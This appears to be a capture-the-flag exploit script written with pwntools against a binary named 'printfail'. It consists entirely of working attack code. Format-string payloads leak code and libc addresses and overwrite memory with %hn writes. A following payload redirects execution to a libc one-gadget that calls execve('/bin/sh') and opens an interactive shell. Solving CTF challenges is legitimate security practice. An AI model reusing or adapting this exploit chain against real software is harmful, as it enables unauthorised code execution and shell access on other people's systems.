from pwn import *

s = process("./printfail")
#s = remote("puffer.utctf.live", 4630)

#pause()

# [stage 1]
p = b"%1c%7$hhn" # 7 - stack (while loop 1)
p += b"%4$p" # 4 - code
p += b"%13$p" # 13 - libc
s.sendlineafter(b"No do-overs.\n",p)

s.recv(1) # %1c
codeleak = int(s.recv(14),16) - 0x4040
log.info("code: " + hex(codeleak))
libcleak = int(s.recv(14),16) - 0x24083
log.info("libc: " + hex(libcleak))

# [stage 2]
finiarray_offset = 0x3d90
buf = codeleak + 0x4040 - finiarray_offset - 1
offset = str(hex(buf))[-4:]
log.info("fsb_payload : " + offset)

p = b"%1c%7$hhn" # 7 - stack (while loop 1)
p += b"%" + str(int(offset, 16)).encode() + b"c"
p += b"%32$hn"
s.sendline(p)

s.recvuntil(b"another chance.")
s.recvuntil(b"another chance.")

# [stage 3]
payload = p64(libcleak + 0x000000000016de72) # add r14b, r11b ; movq qword ptr [rdi], mm1 ; ret
payload += b"A"*54 # dummy
payload += p64(codeleak + 0x000000000001294) # main
payload += p64(0) # set register NULL

s.sendline(payload) # _dl_fini+520 / call QWORD PTR [r14] - loop (_dl_fini+534)

sleep(1)

payload = p64(0) # set rsi NULL
payload += b"A"*46 # dummy (sub r14, 0x8)
payload += p64(libcleak+0xe3b04) # execve("/bin/sh", rsi, rdx) / rsi == NULL && rdx == NULL
payload += p64(0) # set register NULL

s.sendline(payload)

s.interactive()
